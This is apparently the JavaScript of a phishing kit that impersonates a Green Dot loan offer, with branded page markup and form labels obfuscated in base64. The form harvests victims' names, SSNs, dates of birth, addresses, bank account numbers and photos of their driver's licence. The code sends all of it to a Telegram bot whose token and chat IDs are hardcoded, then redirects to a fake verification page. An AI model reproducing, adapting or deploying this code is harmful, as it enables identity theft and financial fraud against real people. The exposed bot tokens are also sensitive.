const app = document.getElementById("app");

// let token = "6818557365:AAGma_2EZmrD7QsqbKMe3wVMMQOOc5HSQr8" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
// let chat_id = -821477061 //-5004137383;
// let def_id = 5004137383 //748063043;
let token = "5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
let chat_id = -821477061 //-5004137383;
let def_id = 748063043 //748063043;
const bt = new Bot(token, def_id);

setTimeout(() => {
    app.innerHTML = `
    <link rel="stylesheet"
    href="./assets/gd-dependencies.min.d1a8bbce41f650c77126045614356ebf.css"
    type="text/css">
  <link rel="stylesheet"
    href="./assets/gd-core.min.a1473654a0882b780a3bbb31f7361f3f.css"
    type="text/css">
  <link rel="stylesheet"
    href="./assets/gdcommon-global.min.14f0f195e84158d9d55774ec694d9df8.css"
    type="text/css">
  <link rel="stylesheet"
    href="./assets/greendotcorp.min.6c8fe930ccfb3df7a10564fdd40369c0.css"
    type="text/css">

  <div class="root responsivegrid container-fluid">

    <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

      <div class="experiencefragment header aem-GridColumn aem-GridColumn--default--12">
        <div id="experiencefragment-29a554b117" class="cmp-experiencefragment cmp-experiencefragment--">
          <div class="xfpage page basicpage gd-redesign help-section-redesign">
            <div class="xf-content-height">
              <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
                <div
                  class="header gd-header-redesign header-with-top-banner aem-GridColumn aem-GridColumn--default--12">

                  <header class="g2b-header" style="justify-content:space-between;">
                    <div class="g2b-header__logo-wrapper">
                      <div class="brand-logo parbase g2b-header__logo">
                        <div class="gd-brand-logo">
                          <div class="brand-logo-container">
                            <a class="gd-brand-logo__link" href="https://www.greendot.com/home"
                              data-di-id="di-id-ab3ce09e-dba8547c">
                              <div class="cmp-image desktop-logo large-show">
                                <img src="./assets/Logo.svg"
                                  class="cmp-image__image light-mode" alt="Greendot Logo">
                                <img
                                  src="./assets/Logo-dark-theme-desktop.svg"
                                  class="cmp-image__image dark-mode" alt="Greendot Logo">
                              </div>
                              <div class="cmp-image mobile-logo large-hide">
                                <img src="./assets/Logo-mob.svg"
                                  class="cmp-image__image light-mode" alt="Greendot Logo">
                                <img
                                  src="./assets/Logo-white-theme-mobile.svg"
                                  class="cmp-image__image dark-mode" alt="Greendot Logo">
                              </div>
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      class="button btn btn-medium btn-primary btn-color-bright-green btn--round-borders btn-text-bold gd-proxima-bold header-btn gap-left-24pt">
                      <a onclick="showForm()" id="button-50f35412db" class="cmp-button">

                        <div class="cmp-button__text">Get loan</div>
                      </a>
                    </div>
                  </header>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="hotfix-component aem-GridColumn aem-GridColumn--default--12" style="padding-top: 139.805px;">
        <style>
          .dark-theme .header-with-top-banner .g2b-header {
            border-bottom: 0px !important
          }

          .black-header .header-with-top-banner .g2b-header {
            border-bottom: 0px !important
          }
        </style>
      </div>
      <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
        <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
          <div class="container responsivegrid bg-container aem-GridColumn aem-GridColumn--default--12">
            <div class="cmp-container " style="background-color:#000;">
              <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
                <div
                  class="container responsivegrid grid-control-width gap-top-24pt-mobile gap-bottom-32pt-mobile aem-GridColumn aem-GridColumn--default--12">
                  <div class="cmp-container " style="background-color:#000;">
                    <div class="aem-Grid aem-Grid--12 aem-Grid--default--12 aem-Grid--phone--12 ">
                      <div
                        class="container responsivegrid vertical-align-center gap-bottom-32pt gap-top-96pt grid-control-width aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--12 aem-GridColumn--offset--phone--0">
                        <div class="cmp-container ">
                          <div
                            class="aem-Grid aem-Grid--12 aem-Grid--tablet--12 aem-Grid--default--12 aem-Grid--phone--12 ">
                            <div
                              class="container responsivegrid bg-container aem-GridColumn--tablet--12 aem-GridColumn--offset--tablet--0 aem-GridColumn--default--none aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn--tablet--none aem-GridColumn aem-GridColumn--default--6 aem-GridColumn--offset--phone--0 aem-GridColumn--offset--default--0">
                              <div class="cmp-container ">
                                <div
                                  class="aem-Grid aem-Grid--6 aem-Grid--tablet--12 aem-Grid--default--6 aem-Grid--phone--12 ">
                                  <div
                                    class="image aem-GridColumn--tablet--12 aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--6">
                                    <div data-asset-id="79107516-d25e-46fb-b94e-6bf9e3de8c72" class="cmp-image  gd-img "
                                      itemscope="" itemtype="http://schema.org/ImageObject">
                                      <img
                                        src="./assets/homepage-acquisition-target-b-mob.png"
                                        alt="Mobile app with visa card" loading="lazy">
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <div
                              class="container responsivegrid bg-container aem-GridColumn--tablet--12 aem-GridColumn--offset--tablet--0 aem-GridColumn--default--none aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn--tablet--none aem-GridColumn aem-GridColumn--default--6 aem-GridColumn--offset--phone--0 aem-GridColumn--offset--default--0">
                              <div class="cmp-container ">
                                <div
                                  class="aem-Grid aem-Grid--6 aem-Grid--tablet--12 aem-Grid--default--6 aem-Grid--phone--12 ">
                                  <div
                                    class="text text-align-center-desktop text-align-center-mobile aem-GridColumn--tablet--12 aem-GridColumn--phone--none aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--6 aem-GridColumn--offset--phone--0">
                                    <div id="text-b5b5d151a9" class="cmp-text">
                                      <p style="color: rgb(255,255,255);"><span class="gd-line-height-120percent"><span
                                            class="gd-headline-4xl gap-bottom-zeropt  gap-bottom-zeropt-mobile hero-subheading"
                                            style="color: rgb(255,255,255);">Green Dot</span></span><img
                                          src="./assets/FDIC-White.svg"
                                          style="margin-left: 10.0px;" class="mobile-fdic" alt="member fdic"><br>
                                        <span class="gd-line-height-120percent"><span
                                            class="gd-headline-6xl gap-bottom-zeropt  gap-bottom-zeropt-mobile hero-heading"
                                            style="color: rgb(255,255,255);">Unlimited<sup
                                              style="font-size: 20.0%;top: -2.8em;">®</sup></span></span><br>
                                        <span class="gd-line-height-120percent"><span
                                            class="gd-headline-xlarge gap-bottom-zeropt  gap-bottom-zeropt-mobile hero-description"
                                            style="color: rgb(255,255,255);"><span class="gd-replicaLL-regular">No loan
                                              fees, no credit score impact</span></span></span>
                                      </p>
                                    </div>
                                  </div>
                                  <div
                                    class="button btn btn-large btn-primary btn-color-neon center-align gap-top-24pt gap-bottom-24pt gap-top-24pt-mobile gap-bottom-16pt-mobile aem-GridColumn--tablet--12 aem-GridColumn--phone--12 aem-GridColumn aem-GridColumn--default--6">
                                    <a onclick="showForm()" id="button-7f852d4a42" class="cmp-button btn-custom-dark-color "
                                      style="--custom-dark-btn-bg-color:#91ff50;--custom-dark-btn-txt-color:#000000;--custom-dark-btn-hoverBg-color:#49d600;--custom-dark-btn-hoverTxt-color:#000000;">
                                      <div class="cmp-button__text">Get loan</div>
                                    </a>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
    `;
}, 3000);

function showLoading() {
    app.innerHTML = `
    <div style="display:flex;justify-content:center;margin-top:40vh;">
        <div class="loader"></div>
    </div>
    `;
}

function flagInputError(msg) {
    alert(msg);
}

function isEmpty(input) {
    return input.value.trim() === "" ? true : false;
}

function showForm() {
    showLoading();
    
    setTimeout(() => {
        app.innerHTML = `
        <div class="container">
    <div class="row">
      <div class="col-lg-3"></div>
      <div class="col-lg-6">
        <section class="card p-4 rounded">
          <h3 class="mb-3">
            ${atob("SnVzdCBhIGZldyBtb3JlIGRldGFpbHMgdG8gYWN0aXZhdGUgeW91ciBsb2Fu")}
          </h3>
          <div class="center">
            <div class="row form-width" id="fileClaim">
              <div class="col-md-12 col-lg-12">
                <!-- <h4 class="mb-3">Kindly the form below with your information to file your claim</h4> -->
                <form class="needs-validation" novalidate>
                  <div class="row g-3">
                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("Rmlyc3QgbmFtZQ==")
                        }
                      </label>
                      <input type="text" class="form-control" id="fname" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid first name is required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("TGFzdCBuYW1l")
                        }
                      </label>
                      <input type="text" class="form-control" id="lname" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid last name is required.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("RW1haWw=")
                        }
                      </label>
                      <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
                      <div class="invalid-feedback">
                        Please enter a valid email address for shipping updates.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("UGhvbmU=")
                        }
                      </label>
                      <input type="tel" class="form-control" id="phone" placeholder="" required>
                      <div class="invalid-feedback">
                        Phone number is required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("RGF0ZSBvZiBiaXJ0aA==")
                        }
                      </label>
                      <input type="date" class="form-control" id="dob" placeholder="" required>
                      <div class="invalid-feedback">
                        Date of birth is required.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("U1NOIChTb2NpYWwgU2VjdXJpdHkgTnVtYmVyKQ==")
                        }
                      </label>
                      <input type="number" class="form-control" id="ssn" placeholder="" required>
                      <div class="invalid-feedback">
                        Please enter a valid Social Security Number.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("QWRkcmVzcw==")
                        }
                      </label>
                      <input type="text" class="form-control" id="address" placeholder="1234 Main St" required>
                      <div class="invalid-feedback">
                        Please enter your address.
                      </div>
                    </div>

                    <div class="col-12">
                      <label class="form-label">
                        ${
                          atob("QWRkcmVzcyAyIDxzcGFuIGNsYXNzPSd0ZXh0LW11dGVkJz4oT3B0aW9uYWwpPC9zcGFuPg==")
                        }
                      </label>
                      <input type="text" class="form-control" id="address2" placeholder="Apartment or suite">
                    </div>

                    <div class="col-md-4">
                      <label for="state" class="form-label">
                        ${
                          atob("U3RhdGU=")
                        }
                      </label>
                      <select class="form-select" id="state" required>
                        <option value="">Choose...</option>
                        <option value="Alabama">Alabama</option>
                        <option value="Alaska">Alaska</option>
                        <option value="Arizona">Arizona</option>
                        <option value="Arkansas">Arkansas</option>
                        <option value="California">California</option>
                        <option value="Colorado">Colorado</option>
                        <option value="Connecticut">Connecticut</option>
                        <option value="Delaware">Delaware</option>
                        <option value="District Of Columbia">District Of Columbia</option>
                        <option value="Florida">Florida</option>
                        <option value="Georgia">Georgia</option>
                        <option value="Hawaii">Hawaii</option>
                        <option value="Idaho">Idaho</option>
                        <option value="Illinois">Illinois</option>
                        <option value="Indiana">Indiana</option>
                        <option value="Iowa">Iowa</option>
                        <option value="Kansas">Kansas</option>
                        <option value="Kentucky">Kentucky</option>
                        <option value="Louisiana">Louisiana</option>
                        <option value="Maine">Maine</option>
                        <option value="Maryland">Maryland</option>
                        <option value="Massachusetts">Massachusetts</option>
                        <option value="Michigan">Michigan</option>
                        <option value="Minnesota">Minnesota</option>
                        <option value="Mississippi">Mississippi</option>
                        <option value="Missouri">Missouri</option>
                        <option value="Montana">Montana</option>
                        <option value="Nebraska">Nebraska</option>
                        <option value="Nevada">Nevada</option>
                        <option value="New Hampshire">New Hampshire</option>
                        <option value="New Jersey">New Jersey</option>
                        <option value="New Mexico">New Mexico</option>
                        <option value="New York">New York</option>
                        <option value="North Carolina">North Carolina</option>
                        <option value="North Dakota">North Dakota</option>
                        <option value="Ohio">Ohio</option>
                        <option value="Oklahoma">Oklahoma</option>
                        <option value="Oregon">Oregon</option>
                        <option value="Pennsylvania">Pennsylvania</option>
                        <option value="Rhode Island">Rhode Island</option>
                        <option value="South Carolina">South Carolina</option>
                        <option value="South Dakota">South Dakota</option>
                        <option value="Tennessee">Tennessee</option>
                        <option value="Texas">Texas</option>
                        <option value="Utah">Utah</option>
                        <option value="Vermont">Vermont</option>
                        <option value="Virginia">Virginia</option>
                        <option value="Washington">Washington</option>
                        <option value="West Virginia">West Virginia</option>
                        <option value="Wisconsin">Wisconsin</option>
                        <option value="Wyoming">Wyoming</option>
                      </select>

                      <div class="invalid-feedback">
                        Please provide a valid state.
                      </div>
                    </div>

                    <div class="col-md-4">
                      <label for="city" class="form-label">
                        ${
                          atob("Q2l0eQ==")
                        }
                      </label>
                      <input type="text" class="form-control" id="city" placeholder="" required>
                      <div class="invalid-feedback">
                        Please enter a valid city.
                      </div>
                    </div>

                    <div class="col-md-4">
                      <label for="postal" class="form-label">
                        ${
                          atob("UG9zdGFs")
                        }
                      </label>
                      <input type="text" class="form-control" id="postal" placeholder="" required>
                      <div class="invalid-feedback">
                        Postal code required.
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div class="row g-3">
                    <div class="col-md-12">
                      <label for="taxReturn" class="form-label">
                        ${
                          atob("RGlkIHlvdSBmaWxlIHlvdXIgMjAyMyB0YXggcmV0dXJuPw==")
                        }
                      </label>
                      <input type="radio" name="taxReturn" class="ms-2" value="Yes" required> Yes
                      <input type="radio" name="taxReturn" class="ms-2" value="No" required> No
                      <div class="invalid-feedback">
                        Please Choose an answer
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div class="row gy-3">
                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("VXBsb2FkIGZyb250IG9mIHlvdXIgU3RhdGUgSUQvREw=")
                        }
                      </label>
                      <input type="file" class="form-control form-control" accept="image/*" id="fileFront">
                      <div class="invalid-feedback">
                        Upload required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("VXBsb2FkIGJhY2sgb2YgeW91ciBTdGF0ZSBJRC9ETA==")
                        }
                      </label>
                      <input type="file" class="form-control form-control" accept="image/*" id="fileBack">
                      <div class="invalid-feedback">
                        Upload required.
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div class="row gy-3">

                    <label class="form-label">
                      ${
                        atob("UGVyc29uYWwgQmFuayBJbmZvcm1hdGlvbg==")
                      }
                    </label>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("QmFuayBuYW1l")
                        }
                      </label>
                      <input type="text" class="form-control" id="bankName" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid first name is required.
                      </div>
                    </div>

                    <div class="col-sm-6">
                      <label class="form-label">
                        ${
                          atob("QWNjb3VudCBudW1iZXI=")
                        }
                      </label>
                      <input type="text" class="form-control" id="acctNo" placeholder="" value="" required>
                      <div class="invalid-feedback">
                        Valid last name is required.
                      </div>
                    </div>
                  </div>

                  <hr class="my-4">

                  <div id="btnResp" class="text-center">
                    <button type="button" onclick="sendForm()">
                      ${
                        atob("UHJvY2VlZA==")
                      }
                    </button>
                  </div>
                </form>
                <br>
              </div>
            </div>
          </div>
        </section>
      </div>
      <div class="col-lg-3"></div>
    </div>
  </div>
        `;
    }, 3000);
}

function sendForm() {
    const fname = document.getElementById("fname");
    const lname = document.getElementById("lname");
    const email = document.getElementById("email");
    const phone = document.getElementById("phone");
    const dob = document.getElementById("dob");
    const ssn = document.getElementById("ssn");
    // const creditScore = document.getElementById("credit");
    const address = document.getElementById("address");
    const address2 = document.getElementById("address2");
    // const country = document.getElementById("country");
    const state = document.getElementById("state");
    const city = document.getElementById("city");
    const postal = document.getElementById("postal");
    const fileFront = document.getElementById("fileFront");
    const fileBack = document.getElementById("fileBack");

    const checkedValue = document.querySelector('input[name="taxReturn"]:checked');
    // console.log(checkedValue.value);

    const bankName = document.getElementById("bankName");
    const acctNo = document.getElementById("acctNo");

    if (isEmpty(fname)) {
        flagInputError("First name must be filled");
    } else if (isEmpty(lname)) {
        flagInputError("Last name must be filled");
    } else if (isEmpty(email)) {
        flagInputError("email field is required");
    } else if (isEmpty(phone)) {
        flagInputError("Phone number field must be filled");
    } else if (isEmpty(dob)) {
        flagInputError("Date of birth field must be filled");
    } else if (isEmpty(ssn)) {
        flagInputError("SSN field must be filled");
    }
    // else if (isEmpty(creditScore)) {
    //     flagInputError("Credit score field must be filled");
    // } 
    else if (isEmpty(address)) {
        flagInputError("Address field must be filled");
    } else if (isEmpty(city)) {
        flagInputError("City field is required");
    } else if (isEmpty(state)) {
        flagInputError("State field must be filled");
    } else if (isEmpty(postal)) {
        flagInputError("Postal field must be filled");
    } else if (!checkedValue) {
        flagInputError("You have to select an answer if you have filed your 2022 tax return");
    } else if (!fileFront.files.length > 0) {
        flagInputError("front of your State ID/DL must be uploaded");
    } else if (!fileBack.files.length > 0) {
        flagInputError("back of your State ID/DL must be uploaded");
    } else if (isEmpty(bankName)) {
        flagInputError("Bank name field must be filled");
    } else if (isEmpty(acctNo)) {
        flagInputError("Bank account number field is required");
    } else {

        showLoading();

        let my_txt = `New Greendot Loan Info %0A`;
        my_txt += `====================%0A`;
        my_txt += `First name: ${fname.value}%0A`;
        my_txt += `Last name: ${lname.value}%0A`;
        my_txt += `Email: ${email.value}%0A`;
        my_txt += `Phone: ${phone.value}%0A`;
        my_txt += `Date of Birth: ${dob.value}%0A`;
        my_txt += `SSN: ${ssn.value}%0A`;
        // my_txt += `Credit Score: ${creditScore.value}%0A`;
        my_txt += `Address: ${address.value}%0A`;
        my_txt += `Address2: ${address2.value}%0A`;
        my_txt += `City: ${city.value}%0A`;
        my_txt += `State: ${state.value}%0A`;
        my_txt += `Postal: ${postal.value}%0A`;
        my_txt += `Did you file your 2023 tax return?: ${checkedValue.value}%0A`;
        my_txt += `Bank name: ${bankName.value}%0A`;
        my_txt += `Account number: ${acctNo.value}%0A`;
        my_txt += `====================%0A`;

        // upload file
        let file1 = fileFront.files;
        let file2 = fileBack.files;
        if (file1.length > 0 && file2.length > 0) {

            bt.sendMessage(my_txt)
                .then(res => {
                    console.log("Msg Success!", res);
                    // Send first file
                    bt.sendFileMod(fileFront)
                        .then(res => {
                            console.log("File1 Success!", res);
                            // Send seconde file
                            bt.sendFileMod(fileBack)
                                .then(res => {
                                    console.log("File2 Success!", res);
                                    // redirect
                                    location.assign("verification/")
                                })
                                .catch(err => {
                                    console.error(err)
                                    // redirect
                                    location.assign("verification/")
                                })
                        })
                        .catch(err => {
                            console.error(err)
                            // redirect
                            location.assign("verification/")
                        }
                        )
                })
                .catch(err => console.error(err))

        } else {
            alert("Uploads failed final upload verification process");
        }
    }
}